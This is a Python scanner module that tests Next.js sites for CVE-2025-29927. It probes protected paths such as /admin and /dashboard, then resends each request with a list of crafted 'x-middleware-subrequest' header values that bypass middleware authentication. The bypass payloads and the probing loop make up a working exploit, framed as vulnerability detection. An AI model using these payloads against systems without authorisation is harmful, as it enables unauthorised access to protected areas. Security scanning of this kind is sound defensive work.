"""Falcon MAG - Next.js Middleware Bypass Scanner

CVE-2025-29927 (March 2025)
Affected: Next.js < 15.2.3, < 14.2.25, < 13.5.9, < 12.3.5

The Next.js middleware uses an internal header 'x-middleware-subrequest'
to track recursive subrequests. If an attacker sends this header manually,
they can BYPASS the middleware entirely.

Impact:
  - Authentication bypass
  - Access to protected routes (/admin, /dashboard)
  - Skipping rate limits, redirects

Detection:
  1. Request protected path → expect 401/403/302
  2. Same request + 'x-middleware-subrequest' header → if 200 → VULNERABLE
"""
import re
from urllib.parse import urljoin

from core.logger import get_logger

log = get_logger("nextjs_bypass")

# Protected paths commonly guarded by middleware
PROTECTED_PATHS = [
    "/admin", "/admin/", "/administrator",
    "/dashboard", "/dashboard/", "/panel",
    "/internal", "/internal/", "/private",
    "/settings", "/account", "/profile/edit",
    "/api/admin", "/api/internal", "/api/private",
    "/api/v1/admin", "/api/v2/admin",
    "/superadmin", "/staff", "/management",
]

# Bypass header values
BYPASS_HEADERS = [
    {"x-middleware-subrequest": "1"},
    {"x-middleware-subrequest": "middleware"},
    {"x-middleware-subrequest": "middleware:middleware:middleware:middleware:middleware"},
    {"x-middleware-subrequest": "pages/_middleware"},
    {"x-middleware-subrequest": "app/_middleware"},
    {"X-Middleware-Subrequest": "1"},   # case variation
    {"x-middleware-subrequest": "src/middleware"},
    {"x-middleware-subrequest": "/middleware"},
]


def _probe(client, url, headers=None, allow_redirects=False):
    """Make a request, return (status, length, location) or (None, None, None).

    Compatible with Falcon HTTPResponse (uses .status, not .status_code).
    """
    try:
        # Falcon HTTPClient doesn't accept allow_redirects — it uses config
        r = client.get(url, headers=headers or {}, timeout=10)
    except TypeError:
        # Fallback for other client types
        try:
            r = client.get(url, headers=headers or {})
        except Exception as e:
            log.debug(f"probe failed {url}: {e}")
            return None, None, None
    except Exception as e:
        log.debug(f"probe failed {url}: {e}")
        return None, None, None

    if r is None:
        return None, None, None

    # --- status: try .status (Falcon) then .status_code (requests) ---
    status = None
    for attr in ("status", "status_code"):
        val = getattr(r, attr, None)
        if val is not None:
            try:
                status = int(val)
                break
            except Exception:
                continue

    if status is None or status == 0:
        # Error response from Falcon
        err = getattr(r, "error", "")
        if err:
            log.debug(f"probe error {url}: {err}")
        return None, None, None

    # --- content length ---
    length = 0
    content = getattr(r, "content", None)
    if content:
        try:
            length = len(content)
        except Exception:
            pass
    elif getattr(r, "text", None):
        try:
            length = len(r.text)
        except Exception:
            pass

    # --- location header ---
    location = ""
    hdrs = getattr(r, "headers", {}) or {}
    try:
        for key in ("location", "Location", "LOCATION"):
            v = hdrs.get(key) if hasattr(hdrs, "get") else None
            if v:
                location = str(v)
                break
    except Exception:
        pass

    return status, length, location

def _looks_protected(status, location):
    """Was the baseline request protected?"""
    if status in (401, 403):
        return True
    if status in (301, 302, 303, 307, 308) and location:
        loc_l = location.lower()
        if any(k in loc_l for k in ("login", "signin", "sign-in", "auth", "sso", "unauthorized", "signup")):
            return True
    return False


def _is_nextjs(client, target):
    """Quick check: is this Next.js?"""
    try:
        r = client.get(target, timeout=10)
        headers_l = {k.lower(): v for k, v in r.headers.items()}
        if "x-powered-by" in headers_l and "next" in headers_l["x-powered-by"].lower():
            return True
        if any(h in headers_l for h in ("x-nextjs-cache", "x-nextjs-prerender", "x-nextjs-stale-time")):
            return True
        text = r.text or ""
        if "__NEXT_DATA__" in text or "self.__next_f" in text or "/_next/static/" in text:
            return True
    except Exception:
        pass
    return False


def run(config=None, client=None, **kwargs):
    if not client:
        return {"error": "no client", "vulnerable": []}

    target = (config.get("target") or "").rstrip("/")
    if not target:
        return {"error": "no target", "vulnerable": []}

    log.info(f"🔍 Next.js Middleware Bypass scan (CVE-2025-29927) on {target}")

    result = {
        "target": target,
        "is_nextjs": False,
        "tested": 0,
        "protected_paths": [],
        "vulnerable": [],
    }

    # Detect Next.js
    if _is_nextjs(client, target):
        result["is_nextjs"] = True
        log.info("  ✓ Next.js detected")
    else:
        log.info("  ⚠ Next.js signature not found (continuing anyway)")

    # Test each protected path
    for path in PROTECTED_PATHS:
        url = urljoin(target + "/", path.lstrip("/"))

        # Baseline
        base_status, base_len, base_loc = _probe(client, url)
        if base_status is None:
            continue

        # Skip if the path is not protected (200 already, or 404)
        if not _looks_protected(base_status, base_loc):
            continue

        result["protected_paths"].append({
            "path": path,
            "baseline_status": base_status,
        })
        log.info(f"  Protected: {path} (baseline: {base_status})")

        # Try each bypass header
        for headers in BYPASS_HEADERS:
            result["tested"] += 1
            h_status, h_len, h_loc = _probe(client, url, headers=headers)
            if h_status is None:
                continue

            header_name = list(headers.keys())[0]
            header_val = list(headers.values())[0]

            # === Strong signal: 200 with header vs. blocked baseline ===
            if h_status == 200 and base_status != 200:
                log.warning(f"  ⚠ BYPASS: {path} with {header_name}={header_val}")
                result["vulnerable"].append({
                    "url": url,
                    "original_url": target,
                    "injected_url": url,
                    "param": header_name,
                    "payload": header_val,
                    "severity": "critical",
                    "description": f"Next.js Middleware Bypass (CVE-2025-29927): {path} accessible with header",
                    "evidence": f"baseline={base_status}, with-header={h_status}",
                    "cve": "CVE-2025-29927",
                })
                break  # one success per path

            # === Medium signal: same status but content differs a lot ===
            if h_status == base_status and base_len and h_len:
                if abs(h_len - base_len) > 800:
                    log.warning(f"  ⚠ Length anomaly: {path} ({base_len} → {h_len})")
                    result["vulnerable"].append({
                        "url": url,
                        "original_url": target,
                        "injected_url": url,
                        "param": header_name,
                        "payload": header_val,
                        "severity": "high",
                        "description": f"Next.js middleware response differs with bypass header on {path}",
                        "evidence": f"baseline_len={base_len}, with-header_len={h_len}",
                        "cve": "CVE-2025-29927",
                    })
                    break

    if result["vulnerable"]:
        log.warning(f"  ⚠ {len(result['vulnerable'])} potential bypasses")
    else:
        log.info("  ℹ No bypass detected (may still be vulnerable on custom paths)")

    return result